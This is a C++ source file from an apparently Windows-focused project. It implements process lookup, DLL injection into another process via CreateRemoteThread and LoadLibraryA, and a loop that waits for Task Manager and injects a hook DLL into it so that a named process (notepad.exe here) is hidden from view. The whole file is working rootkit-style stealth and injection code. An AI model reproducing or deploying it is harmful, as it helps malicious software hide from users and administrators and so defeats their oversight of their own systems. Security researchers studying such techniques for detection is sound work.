#include "pch.h"
#include "SystemUtils.hpp"


uint32_t SystemUtils::get_process_id(const std::wstring& process_name)
{
	HANDLE process_snapshot_handle;
	PROCESSENTRY32 pe32 = { 0 };

	process_snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (process_snapshot_handle == INVALID_HANDLE_VALUE)
	{
		throw WindowsException();
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(process_snapshot_handle, &pe32))
	{
		unsigned long error_code = GetLastError();
		CloseHandle(process_snapshot_handle);
		throw WindowsException(error_code);
	}

	do
	{
		if (_wcsicmp(process_name.c_str(), pe32.szExeFile) == 0)
		{
			CloseHandle(process_snapshot_handle);
			return pe32.th32ProcessID;
		}
		
	} while (Process32Next(process_snapshot_handle, &pe32));

	CloseHandle(process_snapshot_handle);
	
	return NULL;
}

void SystemUtils::inject_dll(const int process_id, const std::string & dll_path)
{
	Process process(process_id);
	void* virutal_address = process.write_process_memory(dll_path);

	try
	{
		Thread remote_thread = process.create_remote_thread(reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), virutal_address);
		remote_thread.run();
		remote_thread.wait();
		process.delete_process_memory(virutal_address);
	}
	catch (...)
	{
		process.delete_process_memory(virutal_address);
		throw;
	}
}

void SystemUtils::hide_process_from_tskmgr(const std::wstring& process_name)
{
	uint32_t notepad_pid = SystemUtils::get_process_id(process_name);
	uint32_t taskmgr_pid = SystemUtils::get_process_id(TASK_MGR_EXE);

	if (notepad_pid == NULL || taskmgr_pid == NULL)
	{
		throw std::exception("Process was not found");
	}

	HANDLE map_handle = Process::map_global_memory(notepad_pid, HIDDEN_PID_NAME);
	try
	{
		SystemUtils::inject_dll(taskmgr_pid, DLL_PATH);
	}
	catch (...)
	{
		CloseHandle(map_handle);
		throw;
	}
}

void SystemUtils::hide_from_task_manager()
{
	while (true)
	{
		Logger::Instance().info(L"Checking for task manager");
		while (!SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
		{
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}

		Logger::Instance().info(L"Found task manager process");
		SystemUtils::hide_process_from_tskmgr(NOTEPAD_EXE);
		Logger::Instance().info(L"Injected hook dll to task manager");

		while (SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
		{
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
		Logger::Instance().info(L"Task manager was closed");
	}
}